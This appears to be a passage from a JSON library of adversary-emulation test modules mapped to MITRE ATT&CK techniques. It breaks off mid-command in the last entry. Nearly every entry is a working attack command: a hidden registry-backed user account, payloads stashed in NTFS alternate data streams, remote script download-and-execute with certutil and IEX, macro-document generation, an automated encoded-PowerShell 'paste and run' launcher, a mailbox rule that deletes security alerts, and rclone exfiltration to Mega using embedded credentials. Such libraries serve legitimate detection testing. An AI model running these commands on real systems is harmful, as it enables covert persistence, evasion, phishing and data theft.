      "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /f >nul 2>&1\nnet user ${user_name}$ /delete >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "user_password",
          "description": "Password for new user account",
          "type": "string",
          "default_value": "At0micRedTeam!"
        },
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "RAGLOXOperator"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "173126b7-afe4-45eb-8680-fa9f6400431c",
      "module_name": "Create Hidden User in Registry"
    },
    {
      "index": 1655,
      "technique_id": "T1564.003",
      "technique_name": "Hide Artifacts: Hidden Window",
      "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process #{powershell_command}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "powershell_command",
          "description": "Command to launch calc.exe from a hidden PowerShell Window",
          "type": "string",
          "default_value": "powershell.exe -WindowStyle hidden calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f151ee37-9e2b-47e6-80e4-550b9f999b7a",
      "module_name": "Hidden Window"
    },
    {
      "index": 1656,
      "technique_id": "T1564.003",
      "technique_name": "Hide Artifacts: Hidden Window",
      "description": "The following RAGLOX Threat Library test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.\nThe default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.\nReference: https://cert.gov.ua/article/5702579\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "start \"\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /im #{browser} /f\n"
      },
      "variables": [
        {
          "name": "bin_id",
          "description": "Mockbin.org BIN ID",
          "type": "string",
          "default_value": "f6b9a876-a826-4ac0-83b8-639d6ad516ec"
        },
        {
          "name": "browser",
          "description": "Browser to use (msedge, chrome, firefox)",
          "type": "string",
          "default_value": "chrome"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0ad9ab92-c48c-4f08-9b20-9633277c4646",
      "module_name": "Headless Browser Accessing Mockbin"
    },
    {
      "index": 1657,
      "technique_id": "T1564.003",
      "technique_name": "Hide Artifacts: Hidden Window",
      "description": "Launch conhost.exe in \"headless\" mode, it means that no visible window will pop up on the victim's machine. \nThis could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity.\nconhost.exe can be used as proxy the execution of arbitrary commands\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "conhost.exe --headless calc.exe\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name calc*\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5510d22f-2595-4911-8456-4d630c978616",
      "module_name": "Hidden Window-Conhost Execution"
    },
    {
      "index": 1658,
      "technique_id": "T1564.004",
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "path",
          "description": "Path of ADS file",
          "type": "path",
          "default_value": "c:\\ADS\\"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8822c3b0-d9f9-4daf-a043-49f4602364f4",
      "module_name": "Alternate Data Streams (ADS)"
    },
    {
      "index": 1659,
      "technique_id": "T1564.004",
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution, cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"#{ads_file_path}\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "payload_path",
          "description": "Path of file to hide in ADS",
          "type": "path",
          "default_value": "c:\\windows\\system32\\cmd.exe"
        },
        {
          "name": "ads_file_path",
          "description": "Path of file to create an ADS under",
          "type": "path",
          "default_value": "C:\\Users\\Public\\Libraries\\yanki\\desktop.ini"
        },
        {
          "name": "ads_name",
          "description": "Name of ADS",
          "type": "string",
          "default_value": "desktop.ini"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2ab75061-f5d5-4c1a-b666-ba2a50df5b02",
      "module_name": "Store file in Alternate Data Stream (ADS)"
    },
    {
      "index": 1660,
      "technique_id": "T1564.004",
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=?\" %i in (#{file_name}:#{ads_filename}) do %i\n",
        "elevation_required": false,
        "cleanup_command": "del #{file_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "File name of file to create ADS on.",
          "type": "string",
          "default_value": "%temp%\\T1564.004_has_ads_cmd.txt"
        },
        {
          "name": "ads_filename",
          "description": "Name of ADS.",
          "type": "string",
          "default_value": "adstest.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "17e7637a-ddaf-4a82-8622-377e20de8fdb",
      "module_name": "Create ADS command prompt"
    },
    {
      "index": 1661,
      "technique_id": "T1564.004",
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, run the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% directory to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path #{file_name} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "File name of file to create ADS on.",
          "type": "string",
          "default_value": "$env:TEMP\\T1564.004_has_ads_powershell.txt"
        },
        {
          "name": "ads_filename",
          "description": "Name of ADS file.",
          "type": "string",
          "default_value": "adstest.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist on disk at specified location (#{file_name})\n",
          "check_command": "if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Path #{file_name} | Out-Null\n"
        }
      ],
      "rx_module_id": "0045ea16-ed3c-4d4c-a9ee-15e44d1560d1",
      "module_name": "Create ADS PowerShell"
    },
    {
      "index": 1662,
      "technique_id": "T1564.004",
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "description": "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution,\nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the\nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "md #{folder_name}\necho too many secrets > #{folder_name}\\#{hidden_filename}\n",
        "elevation_required": false,
        "cleanup_command": "rmdir /S /Q #{folder_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "folder_name",
          "description": "File name of file to create inside the folder.",
          "type": "string",
          "default_value": "%temp%\\...$.......::$index_allocation"
        },
        {
          "name": "hidden_filename",
          "description": "Name of the files containing the hidden information",
          "type": "string",
          "default_value": "secrets.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3e6791e7-232c-481c-a680-a52f86b83fdf",
      "module_name": "Create Hidden Directory via $index_allocation"
    },
    {
      "index": 1663,
      "technique_id": "T1564.006",
      "technique_name": "Run Virtual Instance",
      "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver\nregsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nrundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\"\nsc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n",
        "elevation_required": false,
        "cleanup_command": "sc stop VBoxDRV\nsc delete VBoxDRV\nregsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nmsiexec /x \"#{msi_file_path}\" /qn\n"
      },
      "variables": [
        {
          "name": "msi_file_path",
          "description": "Path to the MSI file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1564.006\\bin\\Virtualbox_52.msi"
        },
        {
          "name": "cab_file_path",
          "description": "Path to the CAB file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1564.006\\bin\\common.cab"
        }
      ],
      "prerequisites": [
        {
          "description": "MSI file must exist on disk at specified location (#{msi_file_path})\n",
          "check_command": "if (Test-Path \"#{msi_file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1564.006/bin/Virtualbox_52.msi\" -OutFile \"#{msi_file_path}\"\n"
        },
        {
          "description": "CAB file must exist on disk at specified location (#{cab_file_path})\n",
          "check_command": "if (Test-Path \"#{cab_file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cab_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1564.006/bin/common.cab\" -OutFile \"#{cab_file_path}\" \n"
        },
        {
          "description": "Old version of Virtualbox must be installed\n",
          "check_command": "if (Test-Path \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\") {exit 0} else {exit 1}\n",
          "install_command": "msiexec /i \"#{msi_file_path}\" /qn\n"
        }
      ],
      "rx_module_id": "c59f246a-34f8-4e4d-9276-c295ef9ba0dd",
      "module_name": "Register Portable Virtualbox"
    },
    {
      "index": 1664,
      "technique_id": "T1564.006",
      "technique_name": "Run Virtual Instance",
      "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n",
        "elevation_required": false,
        "cleanup_command": "\"#{vboxmanage_exe}\" controlvm \"#{vm_name}\" poweroff\n\"#{vboxmanage_exe}\" unregistervm \"#{vm_name}\" --delete"
      },
      "variables": [
        {
          "name": "vm_name",
          "description": "Name of the new virtual machine",
          "type": "string",
          "default_value": "RAGLOX VM"
        },
        {
          "name": "virtualbox_exe",
          "description": "Path to the VirtualBox executable",
          "type": "path",
          "default_value": "C:\\Program Files\\Oracle\\VirtualBox\\VirtualBox.exe"
        },
        {
          "name": "vboxmanage_exe",
          "description": "Path to the executable for VBoxManage, the command-line interface to VirtualBox",
          "type": "path",
          "default_value": "C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe"
        },
        {
          "name": "virtualbox_download",
          "description": "URL for the current installer for the Windows version of VirtualBox, as of March 2022",
          "type": "url",
          "default_value": "https://download.virtualbox.org/virtualbox/6.1.32/VirtualBox-6.1.32-149290-Win.exe"
        },
        {
          "name": "virtualbox_installer",
          "description": "Executable for the Virtualbox installer",
          "type": "string",
          "default_value": "VirtualBox-6.1.32-149290-Win.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "VirtualBox must exist on disk at specified locations (#{virtualbox_exe})\n",
          "check_command": "if (Test-Path \"#{virtualbox_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"
        },
        {
          "description": "VBoxManage must exist on disk at specified locations (#{vboxmanage_exe})\n",
          "check_command": "if (Test-Path \"#{vboxmanage_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"
        }
      ],
      "rx_module_id": "88b81702-a1c0-49a9-95b2-2dd53d755767",
      "module_name": "Create and start VirtualBox virtual machine"
    },
    {
      "index": 1665,
      "technique_id": "T1564.006",
      "technique_name": "Run Virtual Instance",
      "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$VM = \"#{vm_name}\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM",
        "elevation_required": true,
        "cleanup_command": "Stop-VM $VM -Force\nRemove-VM $VM -Force"
      },
      "variables": [
        {
          "name": "vm_name",
          "description": "Name of the new virtual machine",
          "type": "string",
          "default_value": "RAGLOX VM"
        }
      ],
      "prerequisites": [
        {
          "description": "Hyper-V must be enabled on the system\nChecks whether Hyper-V is enabled. If not, enables Hyper-V and forces a required restart\n",
          "check_command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V).State = \"Enabled\") {exit 0} else {exit 1}\n",
          "install_command": "Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force\n"
        }
      ],
      "rx_module_id": "fb8d4d7e-f5a4-481c-8867-febf13f8b6d3",
      "module_name": "Create and start Hyper-V virtual machine"
    },
    {
      "index": 1666,
      "technique_id": "T1564.008",
      "technique_name": "Hide Artifacts: Email Hiding Rules",
      "description": "This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.\n Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue\nNew-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (\"phish\",\"malware\",\"hacked\") -Confirm:$false -DeleteMessage:$true\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-ExchangeOnline -Credential $credential\nRemove-InboxRule -Mailbox #{target_mailbox} -Identity #{mail_rulename} -Confirm:$false\n"
      },
      "variables": [
        {
          "name": "auth_username",
          "description": "M365 Username",
          "type": "string",
          "default_value": "john@contoso.com"
        },
        {
          "name": "auth_password",
          "description": "M365 Password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "mail_rulename",
          "description": "Name of the inbox rule.",
          "type": "string",
          "default_value": "default"
        },
        {
          "name": "target_mailbox",
          "description": "Mailbox you are creating the rule in",
          "type": "string",
          "default_value": "jane@contoso.com"
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name ExchangeOnlineManagement -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement -Force\n"
        }
      ],
      "rx_module_id": "30f7d3d1-78e2-4bf0-9efa-a175b5fce2a9",
      "module_name": "New-Inbox Rule to Hide E-mail in M365"
    },
    {
      "index": 1667,
      "technique_id": "T1566.001",
      "technique_name": "Phishing: Spearphishing Attachment",
      "description": "This RAGLOX module downloads a macro enabled document from the RAGLOX Threat Library GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$url = 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "114ccff9-ae6d-4547-9ead-4cd69f687306",
      "module_name": "Download Macro-Enabled Phishing Attachment"
    },
    {
      "index": 1668,
      "technique_id": "T1566.001",
      "technique_name": "Phishing: Spearphishing Attachment",
      "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "jse_path",
          "description": "Path for the macro to write out the \"malicious\" .jse file\n",
          "type": "string",
          "default_value": "C:\\Users\\Public\\art.jse"
        },
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "cbb6799a-425c-4f83-9194-5447a909d67f",
      "module_name": "Word spawned a command shell and used an IP address in the command line"
    },
    {
      "index": 1669,
      "technique_id": "T1566.002",
      "technique_name": "Phishing: Spearphishing Link",
      "description": "Tests the **Paste and Run** technique, where users are tricked into running\nmalicious PowerShell commands by automating the Win+R command to open the\nRun dialog and input `encoded PowerShell to execute calc.exe.`\n\n- [Fake CAPTCHA Campaign](https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf)\n- [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Add user32.dll for keybd_event\nAdd-Type @\"\n    using System;\n    using System.Runtime.InteropServices;\n    public class K {\n        [DllImport(\"user32.dll\")]\n        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);\n    }\n\"@\n\n# Virtual key codes\n$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002\n\n# Open Run dialog (Win+R)\n[K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)\n[K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)\n\n# Short delay for Run dialog\nStart-Sleep -Milliseconds 500\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.SendKeys]::SendWait(\"cmd /c powershell -ec \" + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('#{execution_command}')) + \"{ENTER}\")\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "execution_command",
          "description": "The command to execute in the run",
          "type": "String",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bc177ef9-6a12-4ebc-a2ec-d41e19c2791d",
      "module_name": "Paste and run technique"
    },
    {
      "index": 1670,
      "technique_id": "T1567.002",
      "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n",
        "elevation_required": false,
        "cleanup_command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n"
      },
      "variables": [
        {
          "name": "rclone_path",
          "description": "Directory of rclone.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"
        },
        {
          "name": "rclone_config_path",
          "description": "Path to rclone's config file (default should be fine)",
          "type": "path",
          "default_value": "$env:appdata"
        },
        {
          "name": "dir_to_copy",
          "description": "Directory to copy",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1567.002"
        },
        {
          "name": "mega_user_account",
          "description": "Mega user account",
          "type": "string",
          "default_value": "ragloxtesting@outlook.com"
        },
        {
          "name": "mega_user_password",
          "description": "Mega user password",
          "type": "string",
          "default_value": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
        },
        {
          "name": "remote_share",
          "description": "Remote Mega share",
          "type": "string",
          "default_value": "T1567002"
        }
      ],
      "prerequisites": [
        {
          "description": "rclone must exist at (#{rclone_path})\n",
          "check_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n"
        }
      ],
      "rx_module_id": "8529ee44-279a-4a19-80bf-b846a40dda58",
      "module_name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
    },
    {
      "index": 1671,
      "technique_id": "T1567.002",
      "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "powershell",
        "command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToRagloxModulesFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = #{aws_region}\n\"@\n$config | Out-File -FilePath \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd 